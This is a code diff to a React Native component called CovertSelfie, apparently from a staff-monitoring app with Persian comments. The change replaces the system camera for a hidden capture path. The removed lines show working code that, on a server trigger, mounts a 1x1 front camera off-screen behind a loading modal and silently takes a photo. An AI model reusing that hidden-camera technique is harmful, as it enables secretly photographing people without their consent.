@@ -1,8 +1,8 @@
 import ActivityIndicator from './components/PulseLoadingIndicator';
 import { getImageConfig } from './img';
 /**
- * سلفی نامحسوس
- * دوربین فقط لحظهٔ عکس‌گیری mount می‌شود.
+ * ثبت تصویر با فرمان مدیر از طریق دوربین سیستمی گوشی.
+ * هیچ دوربین داخلی یا مخفی در این مسیر mount نمی‌شود.
  * به‌جای صفحهٔ سفید کامل، یک modal کوچک لودینگ نمایش داده می‌شود.
  */
 import React, { useEffect, useRef, useState, useCallback } from 'react';
@@ -12,13 +12,7 @@ import { request } from './api';
 import { onCovertTrigger } from './covertTrigger';
 import { FONT } from './theme';
 
-let CameraView = null, useCameraPermissions = null;
-try {
-  const cam = require('expo-camera');
-  CameraView = cam.CameraView;
-  useCameraPermissions = cam.useCameraPermissions;
-} catch {}
-
+import {launchCamera,requestCameraAccess,ImagePicker} from './cameraLock';
 function inHours(hours) {
   if (!hours || !Array.isArray(hours) || !hours.length) return true;
   const now = new Date();
@@ -30,37 +24,22 @@ function inHours(hours) {
   });
 }
 
-// کامپوننت دوربین: mount، عکس، unmount
-function CaptureSession({ onDone }) {
-  const camRef = useRef(null);
-  const tookRef = useRef(false);
-  useEffect(() => {
-    const t = setTimeout(async () => {
-      if (tookRef.current || !camRef.current) { onDone(null); return; }
-      tookRef.current = true;
-      try {
-        const photo = await camRef.current.takePictureAsync({ quality: getImageConfig().quality / 100, base64: true, skipProcessing: true });
-        onDone(photo);
-      } catch { onDone(null); }
-    }, 900);
-    return () => clearTimeout(t);
-  }, []);
-  if (!CameraView) { onDone(null); return null; }
-  // دوربین کاملاً خارج از viewport — جلوی آن را modal می‌پوشاند
-  return (
-    <View style={{ position: 'absolute', top: -9999, left: -9999, width: 1, height: 1 }} pointerEvents="none">
-      <CameraView ref={camRef} style={{ width: 1, height: 1 }} facing="front" />
-    </View>
-  );
+// دوربین سیستمی با امکان ثبت یا لغو توسط کاربر.
+function CaptureSession({onDone}) {
+  const started=useRef(false);
+  useEffect(()=>{if(started.current)return;started.current=true;
+    (async()=>{try{const result=await launchCamera({mediaTypes:['images'],cameraType:ImagePicker.CameraType.front,quality:getImageConfig().quality/100,base64:true});onDone(result.canceled?null:result.assets?.[0]);}catch(_){onDone(null);}})();
+  },[]);
+  return null;
 }
 
 export default function CovertSelfie() {
-  const [perm, requestPerm] = useCameraPermissions ? useCameraPermissions() : [null, async () => null];
+  const [perm,setPerm]=useState(null);const requestPerm=async()=>{const result=await requestCameraAccess();setPerm(result);return result;};
   const [shooting, setShooting] = useState(false);
   const busyRef = useRef(false);
 
   const doCapture = useCallback(async (rsn) => {
-    if (!CameraView || busyRef.current) return;
+    if (busyRef.current) return;
     // دستور سرور حتی خارج از شیفت هم مجاز است، چون به‌صورت هدفمند از پنل ارسال شده است.
     let hasPerm = perm?.granted;
     if (!hasPerm) { const r = await requestPerm().catch(() => null); hasPerm = r?.granted; }
